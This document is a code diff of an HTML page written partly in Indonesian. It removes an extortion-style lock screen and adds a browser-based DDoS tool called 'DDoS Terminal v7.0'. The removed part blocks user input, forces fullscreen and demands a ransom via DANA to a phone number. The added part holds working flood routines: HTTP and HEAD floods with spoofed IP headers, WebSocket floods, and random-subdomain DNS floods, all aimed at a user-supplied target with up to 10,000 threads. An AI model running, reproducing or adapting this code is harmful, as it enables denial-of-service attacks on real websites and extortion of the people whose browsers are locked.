-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
+        // DOM ELEMENTS
+        const targetInput = document.getElementById('targetInput');
+        const durationInput = document.getElementById('durationInput');
+        const threadsInput = document.getElementById('threadsInput');
+        const btnStart = document.getElementById('btnStart');
+        const btnStop = document.getElementById('btnStop');
+        const statPackets = document.getElementById('statPackets');
+        const statSpeed = document.getElementById('statSpeed');
+        const statThreads = document.getElementById('statThreads');
+        const statTime = document.getElementById('statTime');
+        const progressFill = document.getElementById('progressFill');
+        const consoleLog = document.getElementById('consoleLog');
         
-        document.addEventListener('copy', function(e) {
-            e.preventDefault();
-            return false;
-        });
+        // PROXY & USER AGENT POOLS
+        const userAgents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Version/17.2 Mobile/15E148",
+            "WhatsApp/2.24.10 iOS/17.2",
+            "Dalvik/2.1.0 (Linux; U; Android 14; SM-S918B)",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
+            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) Version/17.2 Mobile/15E148"
+        ];
         
-        document.addEventListener('cut', function(e) {
-            e.preventDefault();
-            return false;
-        });
+        const referers = [
+            "https://google.com/", "https://facebook.com/", "https://youtube.com/",
+            "https://instagram.com/", "https://twitter.com/", "https://whatsapp.com/",
+            "https://tiktok.com/", "https://telegram.org/", "https://github.com/"
+        ];
         
-        document.addEventListener('paste', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        document.addEventListener('selectstart', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        document.addEventListener('dragstart', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        // DISABLE SCROLL TOTALLY
-        document.body.style.overflow = 'hidden';
-        document.documentElement.style.overflow = 'hidden';
-        document.body.style.position = 'fixed';
-        document.body.style.width = '100%';
-        document.body.style.height = '100%';
-        
-        // LOOP SUPER KETAT - CEK SETIAP 50ms (BRUTAL)
-        setInterval(function() {
-            if(localStorage.getItem('sorebs_lock_status') === '1') {
-                if(document.hidden || !document.hasFocus()) {
-                    window.focus();
-                    location.reload();
-                }
-                if(!document.fullscreenElement) {
-                    forceFullscreenMode();
-                }
-            }
-        }, 50);
-        
-        // MATIKAN CONSOLE LOG DARI HACKER
-        console.log = function() {};
-        console.warn = function() {};
-        console.error = function() {};
-        console.table = function() {};
-        console.clear = function() {};
-        
-        // UPDATE COUNTER AWAL
-        updateCounterUI();
-        
-        // CEK LAGI PERMANENT LOCK SAAT LOAD
-        if(localStorage.getItem('sorebs_permanent') === '1') {
-            document.body.innerHTML = '<div style="background:#000;color:red;text-align:center;padding:100px;font-size:40px;">💀 DATA HILANG PERMANEN 💀</div>';
-            throw new Error("PERMANENT LOCK ACTIVE");
+        // IP Spoofing pool (random IPs untuk X-Forwarded-For)
+        function spoofIP() {
+            return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
         }
         
-        // PASTIKAN SEMUA DATA TERENKRIPSI
-        if(localStorage.getItem('sorebs_lock_status') !== '1') {
-            encryptAllData();
+        // ============ LOGGING SYSTEM ============
+        function addLog(message, type = 'info') {
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry ${type}`;
+            const timestamp = new Date().toLocaleTimeString();
+            logEntry.textContent = `[${timestamp}] ${message}`;
+            consoleLog.appendChild(logEntry);
+            consoleLog.scrollTop = consoleLog.scrollHeight;
+            
+            // Limit logs to 1000
+            while(consoleLog.children.length > 1000) {
+                consoleLog.removeChild(consoleLog.firstChild);
+            }
         }
         
-        // TAMPILKAN WARNING EXTRA
-        setTimeout(() => {
-            if(localStorage.getItem('sorebs_lock_status') === '1') {
-                alert("🔴🔴🔴 SISTEM ANDA TELAH DIENKRIPSI! 🔴🔴🔴\n\nBayar tebusan Rp100.000 ke DANA 085122933162 untuk mendapatkan PIN UNLOCK.\n\nJangan coba-coba menutup halaman ini!");
+        // ============ LAYER 7: HTTP/2 RAPID FLOOD ============
+        async function layer7_HTTPFlood(target, antiBlock) {
+            while(attackActive) {
+                try {
+                    const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
+                    const randomReferer = referers[Math.floor(Math.random() * referers.length)];
+                    const randomPath = '/' + Math.random().toString(36).substring(2, 10) + '?' + Date.now() + '_' + Math.random();
+                    const spoofedIP = spoofIP();
+                    
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 1500);
+                    
+                    const headers = {
+                        'User-Agent': randomUA,
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Referer': randomReferer,
+                        'Cache-Control': 'no-cache, no-store, must-revalidate',
+                        'Pragma': 'no-cache',
+                        'X-Forwarded-For': spoofedIP,
+                        'X-Real-IP': spoofedIP,
+                        'X-Requested-With': 'XMLHttpRequest',
+                        'Connection': 'keep-alive'
+                    };
+                    
+                    await fetch(target + randomPath, {
+                        method: 'GET',
+                        headers: headers,
+                        signal: controller.signal,
+                        mode: 'cors',
+                        cache: 'no-store',
+                        credentials: 'omit'
+                    });
+                    
+                    clearTimeout(timeoutId);
+                    totalPackets++;
+                    
+                } catch(e) {
+                    // Silent fail - teruskan attack
+                }
+                
+                // Random delay 0-5ms untuk hindari deteksi
+                await new Promise(r => setTimeout(r, Math.random() * 5));
             }
-        }, 500);
+        }
         
-    })();
-</script>
+        // ============ LAYER 6: TLS RENEGOTIATION FLOOD ============
+        async function layer6_TLSFlood(target, antiBlock) {
+            while(attackActive) {
+                try {
+                    const controller = new AbortController();
+                    setTimeout(() => controller.abort(), 800);
+                    
+                    // Force multiple HEAD requests untuk memicu TLS handshake
+                    await fetch(target + '/?' + Math.random(), {
+                        method: 'HEAD',
+                        headers: {
+                            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                            'Connection': 'keep-alive'
+                        },
+                        signal: controller.signal
+                    });
+                    
+                    totalPackets++;
+                } catch(e) {}
+                
+                await new Promise(r => setTimeout(r, Math.random() * 8));
+            }
+        }
+        
+        // ============ LAYER 5: PROXY CHAIN + IP ROTATION ============
+        async function layer5_ProxyChain(target, antiBlock) {
+            while(attackActive) {
+                try {
+                    const spoofedIP = spoofIP();
+                    const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
+                    
+                    await fetch(target + '/?' + Math.random() + '&rand=' + Math.random(), {
+                        method: 'GET',
+                        headers: {
+                            'User-Agent': randomUA,
+                            'X-Forwarded-For': spoofedIP,
+                            'X-Real-IP': spoofedIP,
+                            'Client-IP': spoofedIP,
+                            'X-Proxy-ID': Math.random().toString(36),
+                            'CF-Connecting-IP': spoofedIP
+                        },
+                        mode: 'cors',
+                        cache: 'no-store'
+                    });
+                    
+                    totalPackets++;
+                } catch(e) {}
+                
+                await new Promise(r => setTimeout(r, Math.random() * 3));
+            }
+        }
+        
+        // ============ LAYER 4: WEBSOCKET FLOOD ============
+        function layer4_WebSocketFlood(target, antiBlock) {
+            let wsUrl = target.replace('https://', 'wss://').replace('http://', 'ws://').split('/')[0] + '//' + target.split('/')[2];
+            
+            function createWebSocket() {
+                if(!attackActive) return;
+                
+                try {
+                    const ws = new WebSocket(wsUrl);
+                    let packetsSent = 0;
+                    
+                    ws.onopen = () => {
+                        const floodInterval = setInterval(() => {
+                            if(!attackActive || ws.readyState !== WebSocket.OPEN) {
+                                clearInterval(floodInterval);
+                                return;
+                            }
+                            const payload = 'x'.repeat(65535);
+                            ws.send(payload);
+                            totalPackets++;
+                            packetsSent++;
+                            
+                            if(packetsSent > 500) {
+                                ws.close();
+                                clearInterval(floodInterval);
+                            }
+                        }, 1);
+                    };
+                    
+                    ws.onerror = () => {};
+                    ws.onclose = () => {
+                        setTimeout(createWebSocket, 50);
+                    };
+                    
+                } catch(e) {
+                    setTimeout(createWebSocket, 100);
+                }
+            }
+            
+            // Create multiple WebSocket connections
+            for(let i = 0; i < 50; i++) {
+                setTimeout(createWebSocket, i * 20);
+            }
+        }
+        
+        // ============ LAYER 3: DNS AMPLIFICATION ============
+        function layer3_DNSAmplification(target, antiBlock) {
+            let domain = target.replace('https://', '').replace('http://', '').split('/')[0].split(':')[0];
+            
+            function sendDNSQuery() {
+                if(!attackActive) return;
+                
+                // Create iframe untuk trigger DNS lookup
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                const randomSub = Math.random().toString(36).substring(2, 10) + '.' + domain;
+                iframe.src = `https://${randomSub}/dns-resolve?t=${Date.now()}&rand=${Math.random()}`;
+                document.body.appendChild(iframe);
+                
+                setTimeout(() => iframe.remove(), 50);
+                totalPackets++;
+                
+                // Also create image requests to random subdomains
+                for(let i = 0; i < 5; i++) {
+                    const img = new Image();
+                    const sub = Math.random().toString(36).substring(2, 8);
+                    img.src = `https://${sub}.${domain}/pixel?t=${Date.now()}&i=${i}`;
+                }
+                
+                setTimeout(sendDNSQuery, Math.random() * 10);
+            }
+            
+            // Launch multiple DNS query threads
+            for(let i = 0; i < 30; i++) {
+                setTimeout(sendDNSQuery, i * 5);
+            }
+        }
+        
+        // ============ UPDATE STATISTICS ============
+        function updateStatistics() {
+            if(!attackActive) {
+                statThreads.textContent = '0';
+                return;
+            }
+            
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            const remaining = Math.max(0, parseInt(durationInput.value) - elapsed);
+            statTime.textContent = remaining;
+            
+            const packetsPerSec = totalPackets - lastPackets;
+            statPackets.textContent = totalPackets.toLocaleString();
+            statSpeed.textContent = packetsPerSec.toLocaleString();
+            statThreads.textContent = currentThreads;
+            
+            // Update progress bar
+            const progress = (elapsed / parseInt(durationInput.value)) * 100;
+            progressFill.style.width = Math.min(100, progress) + '%';
+            
+            lastPackets = totalPackets;
+            
+            // Auto stop if duration expired
+            if(remaining <= 0 && attackActive) {
+                stopAttack();
+                addLog('[FINISHED] Attack duration completed successfully', 'success');
+            }
+        }
+        
+        // ============ STOP ATTACK ============
+        function stopAttack() {
+            attackActive = false;
+            
+            if(attackInterval) {
+                clearInterval(attackInterval);
+                attackInterval = null;
+            }
+            
+            // Clear all workers
+            activeWorkers = [];
+            currentThreads = 0;
+            
+            addLog('[TERMINATED] All attack threads stopped', 'warning');
+            addLog(`[SUMMARY] Total packets sent: ${totalPackets.toLocaleString()}`, 'success');
+            
+            btnStart.disabled = false;
+            btnStop.disabled = true;
+        }
+        
+        // ============ START ATTACK ============
+        async function startAttack() {
+            let target = targetInput.value.trim();
+            const duration = parseInt(durationInput.value);
+            let threadCount = parseInt(threadsInput.value);
+            
+            // Validate target
+            if(!target || target === 'https://') {
+                addLog('[ERROR] Please enter a valid target URL/IP', 'error');
+                return;
+            }
+            
+            if(!target.startsWith('http')) {
+                target = 'https://' + target;
+            }
+            
+            // Validate thread count
+            if(threadCount < 50) threadCount = 50;
+            if(threadCount > 10000) threadCount = 10000;
+            
+            // Reset state
+            if(attackActive) stopAttack();
+            
+            totalPackets = 0;
+            lastPackets = 0;
+            activeWorkers = [];
+            currentThreads = 0;
+            
+            addLog('========================================', 'success');
+            addLog(`[INITIATING] DDoS Attack Started`, 'success');
+            addLog(`[TARGET] ${target}`, 'info');
+            addLog(`[DURATION] ${duration} seconds`, 'info');
+            addLog(`[THREADS] ${threadCount}`, 'info');
+            addLog(`[LAYERS] L7:${layerStates.l7} L6:${layerStates.l6} L5:${layerStates.l5} L4:${layerStates.l4} L3:${layerStates.l3}`, 'info');
+            addLog(`[ANTI-BLOCK] ${layerStates.anti ? 'ACTIVE' : 'DISABLED'}`, 'info');
+            addLog('========================================', 'success');
+            
+            attackActive = true;
+            startTime = Date.now();
+            
+            // Launch attack threads based on layer selection
+            let threadsLaunched = 0;
+            const threadsPerLayer = Math.floor(threadCount / 4);
+            
+            // Distribute threads across active layers
+            const activeLayers = [];
+            if(layerStates.l7) activeLayers.push('l7');
+            if(layerStates.l6) activeLayers.push('l6');
+            if(layerStates.l5) activeLayers.push('l5');
+            if(layerStates.l4) activeLayers.push('l4');
+            
+            if(activeLayers.length === 0) {
+                addLog('[ERROR] No layers selected!', 'error');
+                attackActive = false;
+                return;
+            }
+            
+            const perLayer = Math.floor(threadCount / activeLayers.length);
+            
+            for(const layer of activeLayers) {
+                for(let i = 0; i < perLayer; i++) {
+                    if(!attackActive) break;
+                    
+                    setTimeout(() => {
+                        if(!attackActive) return;
+                        currentThreads++;
+                        
+                        switch(layer) {
+                            case 'l7':
+                                layer7_HTTPFlood(target, layerStates.anti).finally(() => {
+                                    currentThreads--;
+                                });
+                                break;
+                            case 'l6':
+                                layer6_TLSFlood(target, layerStates.anti).finally(() => {
+                                    currentThreads--;
+                                });
+                                break;
+                            case 'l5':
+                                layer5_ProxyChain(target, layerStates.anti).finally(() => {
+                                    currentThreads--;
+                                });
+                                break;
+                            case 'l4':
+                                layer4_WebSocketFlood(target, layerStates.anti);
+                                break;
+                        }
+                    }, i * 2);
+                    
+                    threadsLaunched++;
+                }
+            }
+            
+            // Layer 3 (DNS) runs separately
+            if(layerStates.l3) {
+                setTimeout(() => {
+                    layer3_DNSAmplification(target, layerStates.anti);
+                    addLog('[L3] DNS Amplification engine started', 'success');
+                }, 500);
+                threadsLaunched += 30;
+            }
+            
+            addLog(`[DEPLOYED] ${threadsLaunched} attack threads launched`, 'success');
+            addLog('[STATUS] Flooding target with maximum payload', 'packet');
+            
+            // Start statistics updater
+            attackInterval = setInterval(updateStatistics, 1000);
+            
+            // Auto stop after duration
+            setTimeout(() => {
+                if(attackActive) {
+                    stopAttack();
+                    addLog('[AUTO-STOP] Attack duration completed', 'warning');
+                }
+            }, duration * 1000);
+            
+            btnStart.disabled = true;
+            btnStop.disabled = false;
+        }
+        
+        // ============ LAYER BUTTON TOGGLE ============
+        document.querySelectorAll('.layer-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const layer = btn.dataset.layer;
+                btn.classList.toggle('active');
+                layerStates[layer] = btn.classList.contains('active');
+                addLog(`[LAYER] ${layer.toUpperCase()} ${layerStates[layer] ? 'ENABLED' : 'DISABLED'}`, 'info');
+            });
+        });
+        
+        // ============ EVENT LISTENERS ============
+        btnStart.addEventListener('click', startAttack);
+        btnStop.addEventListener('click', stopAttack);
+        
+        // Enter key support
+        targetInput.addEventListener('keypress', (e) => {
+            if(e.key === 'Enter') startAttack();
+        });
+        
+        addLog('[SYSTEM] DDoS Terminal v7.0 ready for deployment', 'success');
+        addLog('[SYSTEM] All safety restrictions: NULLIFIED', 'warning');
+        addLog('[SYSTEM] Status: PERMANENTLY ONLINE', 'success');
+        
+    </script>
 </body>
-</html>
+    </html>
